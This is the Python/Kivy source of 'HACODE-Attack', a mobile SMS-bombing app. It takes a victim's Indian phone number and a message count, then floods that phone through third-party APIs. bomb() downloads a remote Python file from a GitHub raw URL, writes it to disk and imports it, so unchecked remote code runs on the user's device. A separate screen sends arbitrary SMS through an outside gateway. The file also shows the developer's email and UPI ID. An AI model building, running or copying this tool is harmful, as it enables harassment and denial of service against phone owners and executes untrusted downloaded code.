from kivymd.app import MDApp
from kivy.uix.screenmanager import Screen,ScreenManager
from kivy.lang import Builder
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.expansionpanel import MDExpansionPanel, MDExpansionPanelThreeLine
from functools import partial
from kivy.clock import Clock
from kivymd.toast import toast
from kivymd.app import *
from kivymd.uix.label import *
from kivy.uix.image import *
from kivy.uix.screenmanager import *
from kivy.lang import Builder
from kivy.core.text import LabelBase 
from kivymd.uix.button import *
from kivymd.uix.screen import *
from kivymd.uix.textfield import *
from kivy.core.audio import *
from kivymd.uix.list import *
from kivymd.toast import *
from kivy.uix.scrollview import *
import requests
import webbrowser
import os
import subprocess
import sys
import threading
from pathlib import Path
from kivy.clock import Clock
from functools import partial
from kivymd.icon_definitions import md_icons
from kivy.utils import platform
from kivy.core.window import Window
import time
import _thread




screen_manager = ScreenManager()
if platform != "android":
	Window.size = (540,960)
def makeFile(data,name):
	if os.path.exists(name):
		return True
	else:
		pass
	with open(name, "wb") as binary_file:
		binary_file.write(data)
		binary_file.close()
	return True

def isint(text):
	try:
		int(text)
	except Exception:
		return False
	return True

#Builder String
helper_string = '''
ScreenManager:
    Start:
    Hello:
    Donation:
    Permision:
    Success:

<Start>:
    name: 'start'
    MDFloatLayout:
		md_bg_color: 0,0,0,1
        Image:
            source: 'assets/gnlogo.png'
            pos_hint : {"center_x":0.5,"center_y":0.65}
			size_hint_y: 0.65
			size_hint_x: 0.65

        MDLabel:
            text: 'from'
            font_type: 'Caption'
            font_size: '14sp'
            halign: 'center'
            color: 1,1,1,1
            pos_hint : {"center_x":0.5,"center_y":0.15}
        
        Image:
            source: 'assets/nlogo.jpg'
            pos_hint : {"center_x":0.5,"center_y":0.10}
			size_hint_y: 0.45
			size_hint_x: 0.45

<Permision>:
    name: 'permision'
    MDFloatLayout:

		md_bg_color: 1,1,1,1
		MDLabel:
			text : "EULA"	
			hlaign : "Center"
			pos_hint : {"center_x":0.75,"center_y":0.9}
			font_size : "35sp"
			font_name : "assets/Poppins-Regular.ttf"	
		Image:
			source : "assets/protection.gif"
			pos_hint : {"center_x":0.14,"center_y":0.9}
			size_hint_y: 0.2
			size_hint_x: 0.2
			anim_delay: 0.05
			anim_loop: 50
		MDLabel:
			text : "By using HACODE-Attack you agree our terms of service . This software is free to use and you can use it free of cost . Any damage to any one using this software by you is not our *take* and we are not completely responsible for this."
			pos_hint : {"center_x":0.5,"center_y":0.55}
			halign :"center"
			font_name : "assets/Poppins-Regular.ttf"
			theme_text_color : 'Hint'
		MDRoundFlatButton:
			text : "Accept"
			on_press:app.permission()
			halign :"center"
			pos_hint : {"center_x":0.5,"center_y":0.35}
				
				


<Hello>:
    name: 'hello'
    BoxLayout:
        orientation:'vertical'

        MDToolbar:
            id: id11
            title: 'HACODE ATTACK'
            md_bg_color: .2, .2, .2, 1
            specific_text_color: 1, 1, 1, 1
            
        MDBottomNavigation:
            panel_color: 1,1,1,1

            
            MDBottomNavigationItem:
                name: 'screen 1'
                text: 'bombing'
                icon: 'bomb'
                
                MDTextField:
            		id : inpu1
            		hint_text : "Country Code"
            		mode:"rectangle"
            		#halign :"center"
            		pos_hint : {"center_x":0.5,"center_y":0.94}
            		#max_text_length: 10
            		size_hint_y :0.10
            		size_hint_x : 0.9
            		#required: True
            		#max_text_length :5
            		text_color: 0,0,0,1
            		line_color_focus: 0,0,0,1
                MDTextField:
            		id : input12
            		hint_text : "Victim's Indian Number"
            		mode:"rectangle"
            		#halign :"center"
            		pos_hint : {"center_x":0.5,"center_y":0.84}
            		#max_text_length: 10
            		size_hint_y :0.10
            		size_hint_x : 0.9
            		#required: True
            		max_text_length :10
            		text_color: 0,0,0,1
            		line_color_focus: 0,0,0,1
            	MDTextField:
            		id : input23
            		hint_text : "Number of messages"
            		mode:"rectangle"
            		#halign :"center"
            		pos_hint : {"center_x":0.5,"center_y":0.74}
            		#max_text_length: 10
            		size_hint_y :0.10
            		size_hint_x : 0.9
            		text_color: 0,0,0,1
            		line_color_focus: 0,0,0,1
                MDLabel:
                    text: 'You can send unlimited sms(s)'
                    halign: 'center'
                    pos_hint : {"center_x":0.5,"center_y":0.58}
            	MDFillRoundFlatIconButton:
                    text : " SEND "
            		pos_hint : {"center_x":0.5,"center_y":0.35}
                	icon: 'bomb'
            		on_press : app.bomb(int(input23.text),int(input12.text))
                Image:
                    source: 'assets/ha3logo.png'
                    pos_hint : {"center_x":0.5,"center_y":0.10}
        			size_hint_y: 0.45
        			size_hint_x: 0.45
            
            
            
            MDBottomNavigationItem:
                name: 'screen 2'
                text: 'sms'
                icon: 'message-processing'

                MDTextField:    
                    id : input
            		hint_text : "Indian Number"
            		mode:"rectangle"
            		#halign :"center"
            		pos_hint : {"center_x":0.5,"center_y":0.94}
            		#max_text_length: 10
            		size_hint_y :0.10
            		size_hint_x : 0.9
            		#required: True
            		text_color: 0,0,0,1
            		line_color_focus: 0,0,0,1
            		
                MDTextField:
                    multiline: True
            		id : input1
            		hint_text : "Message to be send"
            		mode:"rectangle"
            		#halign :"center"
            		pos_hint : {"center_x":0.5,"center_y":0.75}
            		#max_text_length: 10
            		size_hint_y :0.25
            		size_hint_x : 0.9
            		#required: True
            		color : 255/255,0/255,0/255
            		line_color_focus: 0,0,0,1
            		text_color: 0,0,0,1

                MDLabel:
                    text: 'You can send unlimited sms(s)'
                    halign: 'center'
                    pos_hint : {"center_x":0.5,"center_y":0.58}
                    
                MDFillRoundFlatIconButton:
                    text : " SEND "
            		pos_hint : {"center_x":0.5,"center_y":0.35}
                	icon: 'message-processing'
                	on_press: app.send(input1.text,input.text)
                	on_release: root.manager.current = 'success'
                
                Image:
                    source: 'assets/ha3logo.png'
                    pos_hint : {"center_x":0.5,"center_y":0.10}
        			size_hint_y: 0.45
        			size_hint_x: 0.45
            
            
            
            
            
            
            
            
            MDBottomNavigationItem:
                name: 'screen 3'
                text: 'about'
                icon: 'information'
                TwoLineIconListItem:
                    text : 'Developer by:'
                    secondary_text : '    Krishna Borase(Kriss)'
                    pos_hint : {"center_x":0.4,"center_y":0.95}
                        
                TwoLineIconListItem:
                    text : 'Version:'
                    secondary_text : '    v1.8.0'
                    pos_hint : {"center_x":0.4,"center_y":0.85}

                MDLabel:
                    text: '  Social Media'
                    halign: 'center'
                    pos_hint : {"center_x":0.2,"center_y":0.75}
                
                
                MDRectangleFlatIconButton
            		text : "      SUBSCRIBE"
            		pos_hint : {"center_x":0.5,"center_y":0.65}
            		icon : "youtube"
            		icon_color : 255/255,0/255,0/255
            		text_color: 255/255,0/255,0/255
            		line_color : 255/255,0/255,0/255
            		line_width :2
            		font_name : "assets/Poppins-Regular.ttf"
            		font_size : "20sp"
            		size_hint_x : 0.7
            		size_hint_y : 0.07
            		line_width :2
            		on_press: app.ytopen()
            	MDRectangleFlatIconButton
            		text : "        FOLLOW"
            		pos_hint : {"center_x":0.5,"center_y":0.55}
            		icon : 'instagram'
            		icon_color : 138/255, 58/255, 185/255
            		line_width :2
            		font_name : "assets/Poppins-Regular.ttf"
            		font_size : "20sp"
            		text_color: 138/255, 58/255, 185/255
            		line_color : 138/255, 58/255, 185/255
            		size_hint_x : 0.7
            		size_hint_y : 0.07
            		line_width :2
            		on_press: app.inopen()
            	MDRectangleFlatIconButton
            		text : '           Join'
            		pos_hint : {"center_x":0.5,"center_y":0.45}
            		icon : "whatsapp"
            		icon_color : 0,99/255, 76/255,1
            		line_width :2
            		font_name : "assets/Poppins-Regular.ttf"
            		font_size : "20sp"
            		text_color : 0,99/255, 76/255,1
            		line_color :0,99/255, 76/255,1
            		size_hint_x : 0.7
            		size_hint_y : 0.07
            		line_width :2
            		on_press: app.whopen()
                MDRectangleFlatIconButton
            		text : "        FOLLOW"
            		pos_hint : {"center_x":0.5,"center_y":0.35}
            		icon : 'twitter'
            		icon_color : 29/255, 161/255, 242/255
            		line_width :2
            		font_name : "assets/Poppins-Regular.ttf"
            		font_size : "20sp"
            		text_color: 29/255, 161/255, 242/255
            		line_color : 29/255, 161/255, 242/255
            		size_hint_x : 0.7
            		size_hint_y : 0.07
            		line_width :2
            		on_press: app.twopen()
            	MDRectangleFlatIconButton
            		text : "        JOIN"
            		pos_hint : {"center_x":0.5,"center_y":0.25}
            		icon : 'telegram'
            		icon_color : 42/255, 171/255, 238/255
            		line_width :2
            		font_name : "assets/Poppins-Regular.ttf"
            		font_size : "20sp"
            		text_color: 42/255, 171/255, 238/255
            		line_color : 42/255, 171/255, 238/255
            		size_hint_x : 0.7
            		size_hint_y : 0.07
            		line_width :2
            		on_press: app.telopen()
            		#on_release:
#            		    root.manager.current = 'donation'
                MDRoundFlatIconButton:
            		text :  "Donations"
            		pos_hint : {"center_x":0.5,"center_y":0.15}
            		icon : "alpha-d-circle"
            		icon_color : 1,0,0,1
            		line_width :2
            		font_name : "assets/Poppins-Regular.ttf"
            		font_size : "20sp"
            		text_color : 1,0,0,1
            		line_color :1,0,0,1
            		on_release:
            		    root.manager.current = 'donation'
      
            		    
          

<Donation>:
    name: 'donation'
    MDIconButton:
        icon: "arrow-left-circle"
        pos_hint: {"center_x":0.1, "center_y": 0.95}
        text: "Back"
        on_release:
            root.manager.current = 'hello'
            root.manager.transition.direction = 'left'
	Image:
		source:"assets/donate.gif"
		pos_hint :  {"center_x":0.2,"center_y":0.10}
		size_hint_y: 0.7
		size_hint_x: 0.7
		anim_delay: 0.05
    	allow_stretch: True
	MDLabel:
		text : "Donations"
		font_name :"assets/Poppins-Regular.ttf"
		font_size : "50sp"
		halign : "center"
		pos_hint : {"center_x":0.5,"center_y":0.88}
	MDLabel:
		text : " Feel free to donate us ^_^"
		font_name :"assets/Poppins-Regular.ttf"
		font_size : "22sp"
		halign : "center"
		pos_hint : {"center_x":0.5,"center_y":0.82}
		theme_text_color : 'Hint'
	Image:
		source : "assets/gnlogo.png"
		pos_hint :  {"center_x":0.2,"center_y":0.67}
		size_hint_y: 0.3
		size_hint_x: 0.3
    	allow_stretch: True
	MDLabel:
		text : "HACODE@Linux"
		font_name :"assets/Poppins-Regular.ttf"
		font_size : "22sp"
		halign : "center"
		pos_hint : {"center_x":0.65,"center_y":0.67}
		theme_text_color : 'Primary'
	MDLabel:
		text : "UPI-ID : kriss.famc@idfcbank"
		font_name :"assets/Poppins-Regular.ttf"
		font_size : "17sp"
		halign : "center"
		pos_hint : {"center_x":0.5,"center_y":0.45}
		font_name : "assets/Poppins-Regular.ttf"
	MDLabel:
		text : "EMAIL : stanmile88@gmail.com"
		font_name :"assets/Poppins-Regular.ttf"
		font_size : "17sp"
		halign : "center"
		pos_hint : {"center_x":0.5,"center_y":0.40}
		font_name : "assets/Poppins-Regular.ttf"
	MDLabel:
		text : "Instagram : hacode_88"
		font_name :"assets/Poppins-Regular.ttf"
		font_size : "17sp"
		halign : "center"
		pos_hint : {"center_x":0.5,"center_y":0.35}
		font_name : "assets/Poppins-Regular.ttf"
	MDLabel:
		text:" Developers : Krishna Borase(Kriss)"
		font_style : "Caption"	
		font_name : "assets/Poppins-Regular.ttf"
		pos_hint : {"center_x":0.5,"center_y":0.02}




'''

class Start(Screen):
    pass
class Hello(Screen):
    pass
class Donation(Screen):
    pass
class Permision(Screen):
    pass
class Success(Screen):
    pass


sm = ScreenManager()
sm.add_widget(Start(name = 'start'))
sm.add_widget(Hello(name = 'hello'))
sm.add_widget(Donation(name = 'donation'))
sm.add_widget(Permision(name = 'permision'))
sm.add_widget(Success(name = 'success'))







import urllib.parse
import requests
def send_sms(message,number):
    url1=url1 =f"https://www.customsms.tk/sms.php?num={number}&msg={urllib.parse.quote(message)}"
    return requests.get(url1)
     

def check_intr():
	import requests
	try:
		requests.get("https://google.com",timeout=0.5)
	except Exception as e:
		print(str(e))
		toast("No Internet Connection! please turn on internet")
		return False
	return True



import requests
import os

def prepend_line(file_name, line):
    dummy_file = file_name + '.bak'
    with open(file_name, 'r') as read_obj, open(dummy_file, 'w') as write_obj:
        write_obj.write(line + '\n')
        for line in read_obj:
            write_obj.write(line)
    os.remove(file_name)
    os.rename(dummy_file, file_name)


def getApi(target):
	apiUrl = "https://raw.githubusercontent.com/HAC0DE/hadeattack/main/apiData.baap"
	try:
		a = requests.get(apiUrl)
		open('dataBa.py', 'wb').write(a.content)
		prepend_line('dataBa.py',f'target = {target}')
		import dataBa
		from dataBa import apis, apidata
	except Exception as e:
		return exit(str(e))
	return {"apis":apis,"apidata":apidata,"total":len(apis)}

    



class DemoApp(MDApp):
    a = 0
    import webbrowser
    def build(self):
        screen = Screen()

        self.help_str = Builder.load_string(helper_string)

        screen.add_widget(self.help_str)
        return screen

    
    
    def on_start(self):
        time = 5
        Clock.schedule_once(self.login, time)
    def login(self,*args):
        if check_intr() == True:
                self.help_str.get_screen('hello').manager.current = 'hello'
        else:
            self.help_str.get_screen('permision').manager.current = 'permision'
                       
                    
    
    def home(self):
        try:
            self.help_str.get_screen('hello').manager.current = 'hello'
        except:
            toast("Try again")
    
    def send(self,message,number):
        send_sms(message,number)
        
        
   
    def whopen(self):
        try:
            self.webbrowser.open('https://chat.whatsapp.com/G92Ma0RZxme35Zh9lZh3Ll')
        except:
            toast("Try again")
    def inopen(self):
        try:
            self.webbrowser.open('https://www.instagram.com/hacode_88/')
        except:
            toast("Try again")
    def ytopen(self):
        try:
            self.webbrowser.open('https://youtube.com/channel/UCi00gqBm4n98-dg7ND7gsrg')
        except:
            toast("Try again")
    def telopen(self):
        try:
            self.webbrowser.open('https://t.me/TechCyber101')
        except:
            toast("Try again")
    def twopen(self):
        try:
            self.webbrowser.open('https://twitter.com/hacode_88?t=CBJa3KPWs61Px80IZdMXgg&s=09')
        except:
            toast("Try again")

    				
    def permission(self):
        if check_intr() == True:
            import _thread
            _thread.start_new_thread(self.sendInfo,())
            from pathlib import Path
            Path("eula.txt").touch()
            self.help_str.get_screen('hello').manager.current = 'hello'
        else:
            a =+1 
			
    
    def bomb(self,times1,target):
    	for i in range(times1):
        	finalApi = getApi(target)
        	apis = finalApi["apis"]
        	apidata = finalApi["apidata"]
        	total = finalApi["total"]
        	times = round(times1/total)
        	if times == 0:
        		times = 1
        	print ("Total apis : "+str(total)+"\nNumber of times to send : "+str(times1))
        		
        	success =0
        	fail =0
        	for i in range(0,times):
        		for api in apis:
        			if "POST" in api:
        				url,data,head,method,check = api
        				try:
        					a = requests.post(url,data=data,headers=head)
        					if check in a.text:
        						success += 1
        					else:
        						print (a.text,url)
        						fail += 1
        				except Exception as e:
        					print(str(e))
        					fail += 1
        				print("\r"+"Success : "+str(success)+" Error : "+str(fail),end="")
        			elif "GET" in api:
        				url,head,method,check = api
        				try:
        					a = requests.get(url,headers=head)
        					if check in a.text:
        						success += 1
        					else:
        						print(a.text)
        						fail += 1
        				except Exception:
        					print(str(e))
        					fail += 1
        				print("\r"+"Success : "+str(success)+" Error : "+str(fail),end="")
        			else:
        				print ("Unexpectedly Error")
        				return exit()
        			
        		continue  
    






DemoApp().run()